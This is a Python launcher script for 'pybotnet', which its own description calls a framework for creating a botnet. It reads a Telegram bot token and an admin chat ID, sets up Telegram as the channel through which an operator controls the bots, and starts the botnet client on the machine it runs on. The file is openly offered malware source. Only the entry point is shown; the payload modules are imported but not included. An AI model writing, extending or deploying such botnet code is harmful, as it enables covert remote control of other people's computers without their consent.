import argparse

from . import *

"""run pybotnet by (`python3 -m pybotnet -t [TELEGRAM_TOKEN] -i [ADMIN_CHAT_ID] -n [BOT NAME]`)"""

ENGINE_NAMES = ["telegram"]

if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        prog="pybotnet",
        description="pybotnet - a python framework for creating botnet...",
    )

    parser.add_argument(
        "-e",
        "--engine",
        help="Engines transfer messages between admin and botnet",
        required=False,
        choices=ENGINE_NAMES,
        default="telegram",
    )
    parser.add_argument("-t", "--token", help="bot token", required=False)
    parser.add_argument("-i", "--id", help="admin id", required=False)
    parser.add_argument("-n", "--name", help="bot name", required=False, default=None)
    parser.add_argument(
        "-d", "--debug", help="debug mode", required=False, action="store_true"
    )
    parser.add_argument(
        "-v", "--verbose", help="verbose mode", required=False, action="store_true"
    )

    args = parser.parse_args()

    if args.engine == "telegram":
        if args.verbose:
            print("[+] using telegram engine")

        if args.token is None:
            print("[-] telegram token is required")
            exit(1)
        if args.id is None:
            print("[-] admin chat id is required")
            exit(1)

        engine = TelegramEngine(token=args.token, admin_chat_id=args.id)

    if args.verbose:
        print(f"[+] running pybotnet{package_info.__version__}")

    BotNet(engine, bot_name=args.name, debug=args.debug).run()
